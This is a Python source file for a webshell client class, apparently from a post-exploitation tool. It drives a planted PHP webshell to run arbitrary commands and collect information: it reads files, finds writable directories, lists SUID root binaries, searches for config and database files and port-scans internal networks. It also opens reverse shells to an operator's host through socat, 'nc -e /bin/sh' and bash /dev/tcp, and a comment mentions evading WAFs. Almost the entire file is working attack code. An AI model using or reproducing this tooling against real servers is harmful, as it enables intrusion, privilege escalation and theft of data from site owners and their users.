#!/usr/bin/env python
# encoding: utf-8

from core.utils.string_utils.random_string import random_string
from core.utils.string_utils.list2string import list2string
from core.utils.http.build_url import build_url
from core.log import Log

import requests
import string

class WebShell():
    url = "http://127.0.0.1/c.php"
    method = "POST"
    password = "c"
    webroot = ""
    working = False
    php_version = ""
    kernel_version = ""
    disabled_functions = []
    def __init__(self, url, method, password):
        self.url = url
        self.method = method
        self.password = password
        self.init(self.url, self.method, self.password)
        if self.working:
            self.webroot = self.get_webroot()[1]
            self.php_version = self.get_php_version()
            self.kernel_version = self.get_kernel_version()
            self.print_info()

    def get_webroot(self):
        return self.php_code_exec_token("echo $_SERVER['DOCUMENT_ROOT']")

    def get_php_version(self):
        if self.php_version != "":
            Log.success("PHP Version : \n\t%s" % (self.php_version))
            return self.php_version
        result = self.auto_exec("php -v")
        if result[0]:
            Log.success("PHP Version : \n\t%s" % (result[1][0:-1]))
            return result[1][0:-1]
        else:
            Log.error("Error occured while getting php version! %s" % result[1])
            return ""

    def get_kernel_version(self):
        if self.kernel_version != "":
            Log.success("Kernel Version : \n\t%s" % (self.kernel_version))
            return self.kernel_version
        result = self.auto_exec("uname -a")
        if result[0]:
            Log.success("Kernel Version : \n\t%s" % (result[1][0:-1]))
            return result[1][0:-1]
        else:
            Log.error("Error occured while getting kernel version! %s" % result[1])
            return ""

    def print_info(self):
        Log.success("=" * 32)
        Log.success("URL : %s" % (self.url))
        Log.success("Method : %s" % (self.method))
        Log.success("Password : %s" % (self.password))
        Log.success("Document Root : %s" % (self.webroot))
        Log.success("=" * 32)
        Log.success("PHP version : \n\t%s" % (self.php_version))
        Log.success("Kernel version : \n\t%s" % (self.kernel_version))
        Log.success("=" * 32)

    def read_file(self, filepath):
        Log.info("Reading file : [%s] ..." % (filepath))
        result = self.php_code_exec("echo file_get_contents('%s');" % filepath)
        if result[0]:
            Log.success("Content : \n%s" % (result[1]))
        else:
            Log.error("Error occured! %s" % result[1])

    def get_writable_directory(self):
        command = "find %s -type d -writable" % (self.webroot)
        output = self.auto_exec(command)
        if output[0]:
            if output[1] == "":
                Log.warning("Nothing found!")
            else:
                Log.success("Found : \n%s" % output[1])
        else:
            Log.error("Error occured! %s" % output[1])


    def get_suid_binaries(self):
        paths = ['/usr/local/sbin', '/usr/local/bin', '/usr/sbin', '/usr/bin', '/sbin', '/bin', '/usr/games', '/usr/local/games', '/snap/bin']
        for path in paths:
            command = "find %s -user root -perm -4000 -exec ls -ldb {} \;" % (path)
            Log.info("Executing : %s" % (command))
            output = self.auto_exec(command)
            if output[0]:
                if output[1] == "":
                    Log.warning("Nothing found!")
                else:
                    Log.success("Found : \n%s" % output[1])
            else:
                Log.error("Error occured! %s" % output[1])

    def get_disabled_functions(self):
        if len(self.disabled_functions) != 0:
            Log.success("Disabled functions : \n%s" % list2string(self.disabled_functions, "\t[", "]\n"))
            return
        result = self.php_code_exec_token("echo ini_get('disable_functions');")
        if result[0]:
            if result[1] == "":
                Log.warning("No function disabled!")
                self.disabled_functions = []
            else:
                self.disabled_functions = result[1].split(",")[0:-1]
                Log.success("Disabled functions : \n%s" % list2string(self.disabled_functions, "\t[", "]\n"))
        else:
            Log.error("Error occured! %s" % result[1])

    def get_writable_php_file(self):
        command = "find %s -name '*.php' -writable" % (self.webroot)
        output = self.auto_exec(command)
        if output[0]:
            if output[1] == "":
                Log.warning("Nothing found!")
            else:
                Log.success("Found : \n%s" % output[1])
        else:
            Log.error("Error occured! %s" % output[1])

    def port_scan(self, hosts, ports):
        Log.info("Starting port scan... %s => [%s]" % (hosts, ports))
        code = "set_time_limit(0);error_reporting(0);$ports_input='%s';$hosts_input='%s';$timeout=0.5;$ports=explode(',', $ports_input);$hosts_array=explode('/', $hosts_input);$ip=ip2long($hosts_array[0]);$net_mask=intval($hosts_array[1]);$range=pow(2, (32 - $net_mask));$start=$ip >> (32 - $net_mask) << (32 - $net_mask);for ($i=0;$i < $range;$i++) {$h=long2ip($start + $i);foreach ($ports as $p) {$c=@fsockopen($h, intval($p), $en, $es, $timeout);if (is_resource($c)) {echo $h.':'.$p.' => open\n';fclose($c);} else {echo $h.':'.$p.' => '.$es.'\n';}ob_flush();flush();}}" % (ports, hosts)
        Log.info("Executing : \n%s" % code)
        result = self.php_code_exec_token(code)
        if result[0]:
            Log.success("Result : \n%s" % (result[1]))
        else:
            Log.error("Error occured! %s" % result[1])

    def get_config_file(self):
        keywords = ["config", "db", "database"]
        for key in keywords:
            Log.info("Using keyword : [%s]..." % (key))
            command = "find %s -name '*%s*'" % (self.webroot, key)
            output = self.auto_exec(command)
            if output[0]:
                if output[1] == "":
                    Log.warning("Nothing found!")
                else:
                    Log.success("Found : \n%s" % output[1])
            else:
                Log.error("Error occured! %s" % output[1])

    def check_working(self, url, method, auth):
        Log.info("Checking whether the webshell is still work...")
        key = random_string(6, string.letters)
        value = random_string(32, string.letters)
        token = random_string(32, string.letters)
        Log.info("Using challenge key : [%s] , value : [%s]" % (key, value))
        Log.info("Using token : [%s]" % (token))
        method = string.upper(method)
        if method == "POST" or method == "REQUEST":
            Log.info("Using POST method...")
            data = {auth:'echo "'+token+'";var_dump("$_POST['+key+']");echo "'+token+'";', key:value}
            response = requests.post(url, data=data)
        elif method == "GET":
            Log.info("Using GET method...")
            params = {auth:'echo "'+token+'";var_dump("$_POST['+key+']");echo "'+token+'";'}
            url = build_url(url, params)
            data = {key:value}
            response = requests.post(url, data=data)
        else:
            Log.error("Unsupported method!")
            return False
        content = response.content
        Log.success("The content is :\n " + content)
        return value in content

    def check_connection(self, url):
        Log.info("Checking the connection to the webshell...")
        try:
            response = requests.head(url)
            code = response.status_code
            if code != 200:
                Log.warning("The status code is %d, the webshell may have some problems..." % (response.status_code))
            else:
                Log.success("The status code is %d" % (response.status_code))
            return True
        except:
            Log.error("Connection error!")
            return False

    def init(self, url, method, password):
        if self.check_connection(url):
            self.working = True
        else:
            self.working = False
            return

        if self.check_working(url, method, password):
            Log.success("It works well!")
            self.working = True
        else:
            Log.error("It dead!")
            self.working = False
            return


    def function_call(self, function_name, args):
        # TODO 函数调用 , 可以使用类似回调函数这样的调用方式来绕过WAF
        pass

    def php_command_exec(self,function, command):
        try:
            tick = random_string(3, string.letters)
            token = random_string(32, string.letters)
            if self.method == "POST":
                data = {self.password:"@ini_set('display_errors', '0');echo '"+token+"';"+function+"($_POST["+tick+"]);echo '"+token+"';", tick:command+ " 2>&1"}
                response = requests.post(self.url, data=data)
            elif self.method == "GET":
                params = {self.password:"@ini_set('display_errors', '0');echo '"+token+"';"+function+"($_GET["+tick+"]);echo '"+token+"';", tick:command+ " 2>&1"}
                response = requests.get(self.url, params=params)
            else:
                return (False, "Unsupported method!")
            content = response.text
            if token in content:
                return (True, content.split(token)[1])
            else:
                return (False, content)
        except Exception as e:
            Log.error(e)
            return (False, e)

    def php_code_exec_token(self, code):
        token = random_string(32, string.letters)
        code = 'echo "%s";%s;echo "%s";' % (token, code, token)
        result = self.php_code_exec(code)
        if result[0]:
            content = result[1]
            return (True, content.split(token)[1])
        else:
            return (False, content)

    def php_code_exec(self, code):
        # enable gzip
        code = "ob_start('ob_gzip');" + code + "ob_end_flush();"
        try:
            if self.method == "POST":
                data = {self.password:code}
                response = requests.post(self.url, data=data)
            elif self.method == "GET":
                params = {self.password:code}
                response = requests.get(self.url, params=params)
            else:
                return (False, "Unsupported method!")
            content = response.text
            return (True, content)
        except:
            Log.error("The connection is aborted!")
            return (False, "The connection is aborted!")

    def auto_exec_print(self, command):
        result = self.auto_exec(command)
        if result[0]:
            Log.success("Result : \n%s" % result[1][0:-1])
        else:
            Log.error("Error occured! %s" % result[1][0:-1])


    def auto_exec(self, command):
        # TODO 根据当前环境 , 结合被禁用的函数 , 自动判断使用哪个函数进行命令执行
        return self.php_system(command)

    def php_shell_exec(self, command):
        return self.php_command_exec("echo shell_exec", command)

    def php_system(self, command):
        return self.php_command_exec("system", command)

    def php_popen(self, command):
        # TODO
        pass

    def php_proc_open(self, command):
        # TODO
        pass

    def php_exec(self, command):
        return self.php_command_exec("exec", command)

    def php_passthru(self, command):
        # TODO
        pass

    def reverse_shell_socat(self, binary, ip, port):
        Log.success("Using socat to get a reverse shell...")
        return self.auto_exec("%s tcp-connect:%s:%s exec:'bash -li',pty,stderr,setsid,sigint,sane" % (binary, ip, port))

    def reverse_shell_nc(self, binary, ip, port):
        Log.success("Using nc to get a reverse shell...")
        return self.auto_exec("%s -e /bin/sh %s %s" % (binary, ip, port))

    def reverse_shell_bash(self, ip, port):
        Log.success("Using bash to get a reverse shell...")
        return self.auto_exec("bash -c 'sh -i >&/dev/tcp/%s/%s 0>&1'" % (ip, port))

    def reverse_shell(self, ip, port):
        result = self.check_bin_exists("socat")
        if result[0]:
            content = result[1][0:-1]
            if content != "":
                path = content
                Log.success("socat found! Path : [%s]" % path)
                self.reverse_shell_socat(path, ip, port)
                return
            else:
                Log.error("socat not found!")
        else:
            Log.error("Some error occured!")
        result = self.check_bin_exists("nc")
        if result[0]:
            content = result[1][0:-1]
            if content != "":
                path = content
                Log.success("nc found! Path : [%s]" % path)
                self.reverse_shell_nc(path, ip, port)
                return
            else:
                Log.error("nc not found!")
        else:
            Log.error("Some error occured!")
        self.reverse_shell_bash(ip, port)
        return

    def check_bin_exists(self, binary):
        Log.info("Checking the binary file : [%s]" % binary)
        return self.auto_exec("which %s" % (binary))

    def check_function_exist(self, function_name):
        result = self.php_code_exec('var_dump(function_exists(%s));' % (function_name))
        if result[0]:
            content = result[1]
            if "bool(true)" in content:
                Log.success("The function [%s] is existed!" % (function_name))
                return True
            else:
                Log.error("The function [%s] is not existed!" % (function_name))
                return False
        else:
            Log.error("Some error occured when exec php code...")
            return False
